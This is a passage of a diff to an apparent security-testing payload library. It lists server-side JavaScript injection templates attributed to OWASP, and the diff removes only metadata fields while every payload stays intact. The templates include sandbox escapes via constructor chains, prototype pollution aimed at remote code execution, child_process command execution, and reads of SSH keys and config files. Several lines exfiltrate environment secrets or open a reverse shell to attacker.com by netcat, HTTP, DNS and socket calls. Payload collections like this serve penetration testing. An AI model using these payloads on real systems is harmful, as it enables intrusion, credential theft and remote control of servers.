     "name": "Constructor chain escape",
     "template": "this.constructor.constructor('return process')()",
-    "description": "Constructor chain escape probe from OWASP. Tests application handling of: this.constructor.constructor('...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Constructor chain escape probe from OWASP. Tests application handling of: this.constructor.constructor('..."
   },
   {
     "id": "ssji-owasp-0078",
     "name": "Constructor chain escape #2",
     "template": "this.constructor.constructor('return global')()",
-    "description": "Constructor chain escape probe from OWASP. Tests application handling of: this.constructor.constructor('...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Constructor chain escape probe from OWASP. Tests application handling of: this.constructor.constructor('..."
   },
   {
     "id": "ssji-owasp-0079",
     "name": "Constructor chain escape #3",
     "template": "({}).constructor.constructor('return this')()",
-    "description": "Constructor chain escape probe from OWASP. Tests application handling of: ({}).constructor.constructor('...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Constructor chain escape probe from OWASP. Tests application handling of: ({}).constructor.constructor('..."
   },
   {
     "id": "ssji-owasp-0080",
     "name": "Process access",
     "template": "this.constructor.constructor('return process')().mainModule.require('child_process').execSync('whoami').toString()",
-    "description": "Process access probe from OWASP. Tests application handling of: this.constructor.constructor('...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Process access probe from OWASP. Tests application handling of: this.constructor.constructor('..."
   },
   {
     "id": "ssji-owasp-0081",
     "name": "Process access #2",
     "template": "(function(){return this.constructor.constructor('return process')()})()",
-    "description": "Process access probe from OWASP. Tests application handling of: (function(){return this.constr...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Process access probe from OWASP. Tests application handling of: (function(){return this.constr..."
   },
   {
     "id": "ssji-owasp-0082",
     "name": "Process access #3",
     "template": "({}).constructor.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"id\").toString()')()",
-    "description": "Process access probe from OWASP. Tests application handling of: ({}).constructor.constructor('...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Process access probe from OWASP. Tests application handling of: ({}).constructor.constructor('..."
   },
   {
     "id": "ssji-owasp-0083",
     "name": "Alternative escapes",
     "template": "(function(){return this})().constructor.constructor('return process')()",
-    "description": "Alternative escapes probe from OWASP. Tests application handling of: (function(){return this})().co...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Alternative escapes probe from OWASP. Tests application handling of: (function(){return this})().co..."
   },
   {
     "id": "ssji-owasp-0084",
     "name": "Alternative escapes #2",
     "template": "arguments.callee.caller.constructor('return process')()",
-    "description": "Alternative escapes probe from OWASP. Tests application handling of: arguments.callee.caller.constr...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Alternative escapes probe from OWASP. Tests application handling of: arguments.callee.caller.constr..."
   },
   {
     "id": "ssji-owasp-0085",
     "name": "Prototype pollution",
     "template": "{\"__proto__\": {\"isAdmin\": true}}",
-    "description": "Prototype pollution probe from OWASP. Tests application handling of: {\"__proto__\": {\"isAdmin\": true...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Prototype pollution probe from OWASP. Tests application handling of: {\"__proto__\": {\"isAdmin\": true..."
   },
   {
     "id": "ssji-owasp-0086",
     "name": "Prototype pollution #2",
     "template": "{\"__proto__\": {\"polluted\": \"yes\"}}",
-    "description": "Prototype pollution probe from OWASP. Tests application handling of: {\"__proto__\": {\"polluted\": \"ye...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Prototype pollution probe from OWASP. Tests application handling of: {\"__proto__\": {\"polluted\": \"ye..."
   },
   {
     "id": "ssji-owasp-0087",
     "name": "Prototype pollution #3",
     "template": "{\"constructor\": {\"prototype\": {\"isAdmin\": true}}}",
-    "description": "Prototype pollution probe from OWASP. Tests application handling of: {\"constructor\": {\"prototype\": ...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Prototype pollution probe from OWASP. Tests application handling of: {\"constructor\": {\"prototype\": ..."
   },
   {
     "id": "ssji-owasp-0088",
     "name": "Pollution leading to RCE",
     "template": "{\"__proto__\": {\"toString\": \"require('child_process').execSync('whoami').toString()\"}}",
-    "description": "Pollution leading to RCE probe from OWASP. Tests application handling of: {\"__proto__\": {\"toString\": \"re...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Pollution leading to RCE probe from OWASP. Tests application handling of: {\"__proto__\": {\"toString\": \"re..."
   },
   {
     "id": "ssji-owasp-0089",
     "name": "Pollution leading to RCE #2",
     "template": "{\"__proto__\": {\"valueOf\": \"require('child_process').execSync('id')\"}}",
-    "description": "Pollution leading to RCE probe from OWASP. Tests application handling of: {\"__proto__\": {\"valueOf\": \"req...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Pollution leading to RCE probe from OWASP. Tests application handling of: {\"__proto__\": {\"valueOf\": \"req..."
   },
   {
     "id": "ssji-owasp-0090",
     "name": "10. SETTIMEOUT/SETINTERVAL INJECTION",
     "template": "require('child_process').exec('curl attacker.com/?data=$(whoami)')",
-    "description": "10. SETTIMEOUT/SETINTERVAL INJECTION probe from OWASP. Tests application handling of: require('child_process').exec(...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "10. SETTIMEOUT/SETINTERVAL INJECTION probe from OWASP. Tests application handling of: require('child_process').exec(..."
   },
   {
     "id": "ssji-owasp-0091",
     "name": "10. SETTIMEOUT/SETINTERVAL INJECTION #2",
     "template": "require('fs').writeFileSync('/tmp/pwned', 'hacked')",
-    "description": "10. SETTIMEOUT/SETINTERVAL INJECTION probe from OWASP. Tests application handling of: require('fs').writeFileSync('/...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "10. SETTIMEOUT/SETINTERVAL INJECTION probe from OWASP. Tests application handling of: require('fs').writeFileSync('/..."
   },
   {
     "id": "ssji-owasp-0092",
     "name": "10. SETTIMEOUT/SETINTERVAL INJECTION #3",
     "template": "require('child_process').execSync('nc attacker.com 4444 -e /bin/bash')",
-    "description": "10. SETTIMEOUT/SETINTERVAL INJECTION probe from OWASP. Tests application handling of: require('child_process').execS...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "10. SETTIMEOUT/SETINTERVAL INJECTION probe from OWASP. Tests application handling of: require('child_process').execS..."
   },
   {
     "id": "ssji-owasp-0093",
     "name": "10. SETTIMEOUT/SETINTERVAL INJECTION #4",
     "template": "global.process.exit(1)",
-    "description": "10. SETTIMEOUT/SETINTERVAL INJECTION probe from OWASP. Tests application handling of: global.process.exit(1)",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "10. SETTIMEOUT/SETINTERVAL INJECTION probe from OWASP. Tests application handling of: global.process.exit(1)"
   },
   {
     "id": "ssji-owasp-0094",
     "name": "Direct require",
     "template": "require('child_process')",
-    "description": "Direct require probe from OWASP. Tests application handling of: require('child_process')",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Direct require probe from OWASP. Tests application handling of: require('child_process')"
   },
   {
     "id": "ssji-owasp-0095",
     "name": "Direct require #2",
     "template": "require('fs')",
-    "description": "Direct require probe from OWASP. Tests application handling of: require('fs')",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Direct require probe from OWASP. Tests application handling of: require('fs')"
   },
   {
     "id": "ssji-owasp-0096",
     "name": "Direct require #3",
     "template": "require('net')",
-    "description": "Direct require probe from OWASP. Tests application handling of: require('net')",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Direct require probe from OWASP. Tests application handling of: require('net')"
   },
   {
     "id": "ssji-owasp-0097",
     "name": "Direct require #4",
     "template": "require('http')",
-    "description": "Direct require probe from OWASP. Tests application handling of: require('http')",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Direct require probe from OWASP. Tests application handling of: require('http')"
   },
   {
     "id": "ssji-owasp-0098",
     "name": "Global require",
     "template": "global.require('child_process')",
-    "description": "Global require probe from OWASP. Tests application handling of: global.require('child_process'...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Global require probe from OWASP. Tests application handling of: global.require('child_process'..."
   },
   {
     "id": "ssji-owasp-0099",
     "name": "Global require #2",
     "template": "global.process.mainModule.require('child_process')",
-    "description": "Global require probe from OWASP. Tests application handling of: global.process.mainModule.requ...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Global require probe from OWASP. Tests application handling of: global.process.mainModule.requ..."
   },
   {
     "id": "ssji-owasp-0100",
     "name": "Module constructor",
     "template": "process.mainModule.constructor._load('child_process')",
-    "description": "Module constructor probe from OWASP. Tests application handling of: process.mainModule.constructor...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Module constructor probe from OWASP. Tests application handling of: process.mainModule.constructor..."
   },
   {
     "id": "ssji-owasp-0101",
     "name": "Module constructor #2",
     "template": "global.process.mainModule.constructor._load('fs')",
-    "description": "Module constructor probe from OWASP. Tests application handling of: global.process.mainModule.cons...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Module constructor probe from OWASP. Tests application handling of: global.process.mainModule.cons..."
   },
   {
     "id": "ssji-owasp-0102",
     "name": "12. ENVIRONMENT VARIABLE EXFILTRATION",
     "template": "JSON.stringify(process.env)",
-    "description": "12. ENVIRONMENT VARIABLE EXFILTRATION probe from OWASP. Tests application handling of: JSON.stringify(process.env)",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "12. ENVIRONMENT VARIABLE EXFILTRATION probe from OWASP. Tests application handling of: JSON.stringify(process.env)"
   },
   {
     "id": "ssji-owasp-0103",
     "name": "12. ENVIRONMENT VARIABLE EXFILTRATION #2",
     "template": "process.env.PATH",
-    "description": "12. ENVIRONMENT VARIABLE EXFILTRATION probe from OWASP. Tests application handling of: process.env.PATH",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "12. ENVIRONMENT VARIABLE EXFILTRATION probe from OWASP. Tests application handling of: process.env.PATH"
   },
   {
     "id": "ssji-owasp-0104",
     "name": "12. ENVIRONMENT VARIABLE EXFILTRATION #3",
     "template": "process.env.HOME",
-    "description": "12. ENVIRONMENT VARIABLE EXFILTRATION probe from OWASP. Tests application handling of: process.env.HOME",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "12. ENVIRONMENT VARIABLE EXFILTRATION probe from OWASP. Tests application handling of: process.env.HOME"
   },
   {
     "id": "ssji-owasp-0105",
     "name": "12. ENVIRONMENT VARIABLE EXFILTRATION #4",
     "template": "process.env.USER",
-    "description": "12. ENVIRONMENT VARIABLE EXFILTRATION probe from OWASP. Tests application handling of: process.env.USER",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "12. ENVIRONMENT VARIABLE EXFILTRATION probe from OWASP. Tests application handling of: process.env.USER"
   },
   {
     "id": "ssji-owasp-0106",
     "name": "12. ENVIRONMENT VARIABLE EXFILTRATION #5",
     "template": "process.env.SECRET_KEY",
-    "description": "12. ENVIRONMENT VARIABLE EXFILTRATION probe from OWASP. Tests application handling of: process.env.SECRET_KEY",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "12. ENVIRONMENT VARIABLE EXFILTRATION probe from OWASP. Tests application handling of: process.env.SECRET_KEY"
   },
   {
     "id": "ssji-owasp-0107",
     "name": "12. ENVIRONMENT VARIABLE EXFILTRATION #6",
     "template": "process.env.DATABASE_URL",
-    "description": "12. ENVIRONMENT VARIABLE EXFILTRATION probe from OWASP. Tests application handling of: process.env.DATABASE_URL",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "12. ENVIRONMENT VARIABLE EXFILTRATION probe from OWASP. Tests application handling of: process.env.DATABASE_URL"
   },
   {
     "id": "ssji-owasp-0108",
     "name": "12. ENVIRONMENT VARIABLE EXFILTRATION #7",
     "template": "process.env.API_KEY",
-    "description": "12. ENVIRONMENT VARIABLE EXFILTRATION probe from OWASP. Tests application handling of: process.env.API_KEY",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "12. ENVIRONMENT VARIABLE EXFILTRATION probe from OWASP. Tests application handling of: process.env.API_KEY"
   },
   {
     "id": "ssji-owasp-0109",
     "name": "Read sensitive files",
     "template": "require('fs').readFileSync('/etc/hosts', 'utf8')",
-    "description": "Read sensitive files probe from OWASP. Tests application handling of: require('fs').readFileSync('/e...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Read sensitive files probe from OWASP. Tests application handling of: require('fs').readFileSync('/e..."
   },
   {
     "id": "ssji-owasp-0110",
     "name": "Read sensitive files #2",
     "template": "require('fs').readFileSync('/home/user/.ssh/id_rsa', 'utf8')",
-    "description": "Read sensitive files probe from OWASP. Tests application handling of: require('fs').readFileSync('/h...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Read sensitive files probe from OWASP. Tests application handling of: require('fs').readFileSync('/h..."
   },
   {
     "id": "ssji-owasp-0111",
     "name": "Read sensitive files #3",
     "template": "require('fs').readFileSync('config/database.yml', 'utf8')",
-    "description": "Read sensitive files probe from OWASP. Tests application handling of: require('fs').readFileSync('co...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Read sensitive files probe from OWASP. Tests application handling of: require('fs').readFileSync('co..."
   },
   {
     "id": "ssji-owasp-0112",
     "name": "Directory listing",
     "template": "require('fs').readdirSync('/etc').toString()",
-    "description": "Directory listing probe from OWASP. Tests application handling of: require('fs').readdirSync('/et...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Directory listing probe from OWASP. Tests application handling of: require('fs').readdirSync('/et..."
   },
   {
     "id": "ssji-owasp-0113",
     "name": "Directory listing #2",
     "template": "require('fs').readdirSync('.').toString()",
-    "description": "Directory listing probe from OWASP. Tests application handling of: require('fs').readdirSync('.')...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Directory listing probe from OWASP. Tests application handling of: require('fs').readdirSync('.')..."
   },
   {
     "id": "ssji-owasp-0114",
     "name": "exec variations",
     "template": "require('child_process').exec('cat /etc/passwd', (e,o)=>console.log(o))",
-    "description": "exec variations probe from OWASP. Tests application handling of: require('child_process').exec(...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "exec variations probe from OWASP. Tests application handling of: require('child_process').exec(..."
   },
   {
     "id": "ssji-owasp-0115",
     "name": "exec variations #2",
     "template": "require('child_process').execFileSync('ls', ['-la']).toString()",
-    "description": "exec variations probe from OWASP. Tests application handling of: require('child_process').execF...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "exec variations probe from OWASP. Tests application handling of: require('child_process').execF..."
   },
   {
     "id": "ssji-owasp-0116",
     "name": "spawn variations",
     "template": "require('child_process').spawn('cat', ['/etc/passwd'])",
-    "description": "spawn variations probe from OWASP. Tests application handling of: require('child_process').spawn...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "spawn variations probe from OWASP. Tests application handling of: require('child_process').spawn..."
   },
   {
     "id": "ssji-owasp-0117",
     "name": "spawn variations #2",
     "template": "require('child_process').spawnSync('id').stdout.toString()",
-    "description": "spawn variations probe from OWASP. Tests application handling of: require('child_process').spawn...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "spawn variations probe from OWASP. Tests application handling of: require('child_process').spawn..."
   },
   {
     "id": "ssji-owasp-0118",
     "name": "HTTP request",
     "template": "require('http').get('http://attacker.com/?data=exfiltrated')",
-    "description": "HTTP request probe from OWASP. Tests application handling of: require('http').get('http://at...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "HTTP request probe from OWASP. Tests application handling of: require('http').get('http://at..."
   },
   {
     "id": "ssji-owasp-0119",
     "name": "HTTP request #2",
     "template": "require('https').get('https://attacker.com/?data=' + process.env.SECRET)",
-    "description": "HTTP request probe from OWASP. Tests application handling of: require('https').get('https://...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "HTTP request probe from OWASP. Tests application handling of: require('https').get('https://..."
   },
   {
     "id": "ssji-owasp-0120",
     "name": "DNS exfiltration",
     "template": "require('dns').resolve4(process.env.SECRET + '.attacker.com')",
-    "description": "DNS exfiltration probe from OWASP. Tests application handling of: require('dns').resolve4(proces...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "DNS exfiltration probe from OWASP. Tests application handling of: require('dns').resolve4(proces..."
   },
   {
     "id": "ssji-owasp-0121",
     "name": "Socket connection",
     "template": "require('net').connect(4444, 'attacker.com')",
-    "description": "Socket connection probe from OWASP. Tests application handling of: require('net').connect(4444, '...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Socket connection probe from OWASP. Tests application handling of: require('net').connect(4444, '..."
   },
   {
     "id": "ssji-owasp-0122",
     "name": "16. PROCESS MANIPULATION",
     "template": "process.exit(1)",
-    "description": "16. PROCESS MANIPULATION probe from OWASP. Tests application handling of: process.exit(1)",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "16. PROCESS MANIPULATION probe from OWASP. Tests application handling of: process.exit(1)"
   },
   {
     "id": "ssji-owasp-0123",
     "name": "16. PROCESS MANIPULATION #2",
     "template": "process.kill(process.pid)",
-    "description": "16. PROCESS MANIPULATION probe from OWASP. Tests application handling of: process.kill(process.pid)",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "16. PROCESS MANIPULATION probe from OWASP. Tests application handling of: process.kill(process.pid)"
   },
   {
     "id": "ssji-owasp-0124",
     "name": "16. PROCESS MANIPULATION #3",
     "template": "process.chdir('/')",
-    "description": "16. PROCESS MANIPULATION probe from OWASP. Tests application handling of: process.chdir('/')",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "16. PROCESS MANIPULATION probe from OWASP. Tests application handling of: process.chdir('/')"
   },
   {
     "id": "ssji-owasp-0125",
     "name": "16. PROCESS MANIPULATION #4",
     "template": "process.binding('spawn_sync')",
-    "description": "16. PROCESS MANIPULATION probe from OWASP. Tests application handling of: process.binding('spawn_sync')",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "16. PROCESS MANIPULATION probe from OWASP. Tests application handling of: process.binding('spawn_sync')"
   },
   {
     "id": "ssji-owasp-0126",
     "name": "17. CRYPTO MODULE ACCESS",
     "template": "require('crypto').randomBytes(16).toString('hex')",
-    "description": "17. CRYPTO MODULE ACCESS probe from OWASP. Tests application handling of: require('crypto').randomBytes(...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "17. CRYPTO MODULE ACCESS probe from OWASP. Tests application handling of: require('crypto').randomBytes(..."
   },
   {
     "id": "ssji-owasp-0127",
     "name": "17. CRYPTO MODULE ACCESS #2",
     "template": "require('crypto').getHashes()",
-    "description": "17. CRYPTO MODULE ACCESS probe from OWASP. Tests application handling of: require('crypto').getHashes()",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "17. CRYPTO MODULE ACCESS probe from OWASP. Tests application handling of: require('crypto').getHashes()"
   },
   {
     "id": "ssji-owasp-0128",
     "name": "17. CRYPTO MODULE ACCESS #3",
     "template": "require('crypto').getCiphers()",
-    "description": "17. CRYPTO MODULE ACCESS probe from OWASP. Tests application handling of: require('crypto').getCiphers()",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "17. CRYPTO MODULE ACCESS probe from OWASP. Tests application handling of: require('crypto').getCiphers()"
   },
   {
     "id": "ssji-owasp-0129",
     "name": "18. OS MODULE ACCESS",
     "template": "require('os').userInfo()",
-    "description": "18. OS MODULE ACCESS probe from OWASP. Tests application handling of: require('os').userInfo()",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "18. OS MODULE ACCESS probe from OWASP. Tests application handling of: require('os').userInfo()"
   },
   {
     "id": "ssji-owasp-0130",
     "name": "18. OS MODULE ACCESS #2",
     "template": "require('os').hostname()",
-    "description": "18. OS MODULE ACCESS probe from OWASP. Tests application handling of: require('os').hostname()",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "18. OS MODULE ACCESS probe from OWASP. Tests application handling of: require('os').hostname()"
   },
   {
     "id": "ssji-owasp-0131",
     "name": "18. OS MODULE ACCESS #3",
     "template": "require('os').platform()",
-    "description": "18. OS MODULE ACCESS probe from OWASP. Tests application handling of: require('os').platform()",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "18. OS MODULE ACCESS probe from OWASP. Tests application handling of: require('os').platform()"
   },
   {
     "id": "ssji-owasp-0132",
     "name": "18. OS MODULE ACCESS #4",
     "template": "require('os').arch()",
-    "description": "18. OS MODULE ACCESS probe from OWASP. Tests application handling of: require('os').arch()",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "18. OS MODULE ACCESS probe from OWASP. Tests application handling of: require('os').arch()"
   },
   {
     "id": "ssji-owasp-0133",
     "name": "18. OS MODULE ACCESS #5",
     "template": "require('os').cpus()",
-    "description": "18. OS MODULE ACCESS probe from OWASP. Tests application handling of: require('os').cpus()",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "18. OS MODULE ACCESS probe from OWASP. Tests application handling of: require('os').cpus()"
   },
   {
     "id": "ssji-owasp-0134",
     "name": "18. OS MODULE ACCESS #6",
     "template": "require('os').networkInterfaces()",
-    "description": "18. OS MODULE ACCESS probe from OWASP. Tests application handling of: require('os').networkInterface...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "18. OS MODULE ACCESS probe from OWASP. Tests application handling of: require('os').networkInterface..."
   },
   {
     "id": "ssji-owasp-0135",
     "name": "18. OS MODULE ACCESS #7",
     "template": "require('os').tmpdir()",
-    "description": "18. OS MODULE ACCESS probe from OWASP. Tests application handling of: require('os').tmpdir()",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "18. OS MODULE ACCESS probe from OWASP. Tests application handling of: require('os').tmpdir()"
   },
   {
     "id": "ssji-owasp-0136",
     "name": "18. OS MODULE ACCESS #8",
     "template": "require('os').homedir()",
-    "description": "18. OS MODULE ACCESS probe from OWASP. Tests application handling of: require('os').homedir()",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "18. OS MODULE ACCESS probe from OWASP. Tests application handling of: require('os').homedir()"
   },
   {
     "id": "ssji-owasp-0137",
     "name": "19. PATH MODULE FOR TRAVERSAL",
     "template": "require('path').resolve('/etc/passwd')",
-    "description": "19. PATH MODULE FOR TRAVERSAL probe from OWASP. Tests application handling of: require('path').resolve('/etc/...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "19. PATH MODULE FOR TRAVERSAL probe from OWASP. Tests application handling of: require('path').resolve('/etc/..."
   },
   {
     "id": "ssji-owasp-0138",
     "name": "19. PATH MODULE FOR TRAVERSAL #2",
     "template": "require('path').join(__dirname, '../../../etc/passwd')",
-    "description": "19. PATH MODULE FOR TRAVERSAL probe from OWASP. Tests application handling of: require('path').join(__dirname...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "19. PATH MODULE FOR TRAVERSAL probe from OWASP. Tests application handling of: require('path').join(__dirname..."
   },
   {
     "id": "ssji-owasp-0139",
     "name": "$function aggregation (MongoDB 4.4+)",
     "template": "{$function: {",
-    "description": "$function aggregation (MongoDB 4.4+) probe from OWASP. Tests application handling of: {$function: {",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "$function aggregation (MongoDB 4.4+) probe from OWASP. Tests application handling of: {$function: {"
   },
   {
     "id": "ssji-owasp-0140",
     "name": "$function aggregation (MongoDB 4.4+) #2",
     "template": "body: function() { return require('child_process').execSync('whoami').toString(); },",
-    "description": "$function aggregation (MongoDB 4.4+) probe from OWASP. Tests application handling of: body: function() { return requ...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "$function aggregation (MongoDB 4.4+) probe from OWASP. Tests application handling of: body: function() { return requ..."
   },
   {
     "id": "ssji-owasp-0141",
     "name": "$function aggregation (MongoDB 4.4+) #3",
     "template": "args: [],",
-    "description": "$function aggregation (MongoDB 4.4+) probe from OWASP. Tests application handling of: args: [],",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "$function aggregation (MongoDB 4.4+) probe from OWASP. Tests application handling of: args: [],"
   },
   {
     "id": "ssji-owasp-0142",
     "name": "$function aggregation (MongoDB 4.4+) #4",
     "template": "lang: \"js\"",
-    "description": "$function aggregation (MongoDB 4.4+) probe from OWASP. Tests application handling of: lang: \"js\"",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "$function aggregation (MongoDB 4.4+) probe from OWASP. Tests application handling of: lang: \"js\""
   },
   {
     "id": "ssji-owasp-0143",
     "name": "$function aggregation (MongoDB 4.4+) #5",
     "template": "}}",
-    "description": "$function aggregation (MongoDB 4.4+) probe from OWASP. Tests application handling of: }}",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "$function aggregation (MongoDB 4.4+) probe from OWASP. Tests application handling of: }}"
   },
   {
     "id": "ssji-owasp-0144",
     "name": "mapReduce injection",
     "template": "{",
-    "description": "mapReduce injection probe from OWASP. Tests application handling of: {",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "mapReduce injection probe from OWASP. Tests application handling of: {"
   },
   {
     "id": "ssji-owasp-0145",
     "name": "mapReduce injection #2",
     "template": "map: function() { require('child_process').exec('curl attacker.com/?data=pwned'); emit(this._id, 1); },",
-    "description": "mapReduce injection probe from OWASP. Tests application handling of: map: function() { require('chi...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "mapReduce injection probe from OWASP. Tests application handling of: map: function() { require('chi..."
   },
   {
     "id": "ssji-owasp-0146",
     "name": "mapReduce injection #3",
     "template": "reduce: function(k, v) { return Array.sum(v); }",
-    "description": "mapReduce injection probe from OWASP. Tests application handling of: reduce: function(k, v) { retur...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "mapReduce injection probe from OWASP. Tests application handling of: reduce: function(k, v) { retur..."
   },
   {
     "id": "ssji-owasp-0147",
     "name": "mapReduce injection #4",
     "template": "}",
-    "description": "mapReduce injection probe from OWASP. Tests application handling of: }",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "mapReduce injection probe from OWASP. Tests application handling of: }"
   },
   {
     "id": "ssji-owasp-0148",
     "name": "res.render with unsafe data",
     "template": "<%= user.input %>",
-    "description": "res.render with unsafe data probe from OWASP. Tests application handling of: <%= user.input %>",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "res.render with unsafe data probe from OWASP. Tests application handling of: <%= user.input %>"
   },
   {
     "id": "ssji-owasp-0149",
     "name": "res.render with unsafe data #2",
     "template": "#{user.input}",
-    "description": "res.render with unsafe data probe from OWASP. Tests application handling of: #{user.input}",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "res.render with unsafe data probe from OWASP. Tests application handling of: #{user.input}"
   },
   {
     "id": "ssji-owasp-0150",
